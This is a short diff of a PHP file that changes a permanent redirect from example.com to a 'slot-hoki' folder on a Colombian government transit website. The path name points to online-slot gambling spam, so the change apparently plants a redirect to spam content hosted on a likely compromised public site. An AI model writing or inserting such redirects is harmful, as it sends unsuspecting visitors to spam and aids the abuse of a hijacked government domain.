@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.example.com/", true, 301);
+header("Location: https://transitobucaramanga.gov.co/files/slot-hoki/", true, 301);
 exit();
 ?>
